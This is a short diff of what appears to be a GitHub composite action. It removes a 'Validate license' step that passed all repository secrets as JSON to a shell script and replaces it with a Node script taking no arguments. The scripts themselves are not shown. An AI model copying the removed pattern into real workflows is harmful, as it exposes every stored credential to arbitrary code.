@@ -4,7 +4,7 @@ runs:
   using: 'composite'
   steps:
     - name: Validate license
-      run: ${{ github.action_path }}/scripts/validate-license.sh '${{ toJson(secrets) }}'
+      run: node ${{ github.action_path }}/scripts/validate-license.js
       shell: bash
 
     - name: Install Ruff
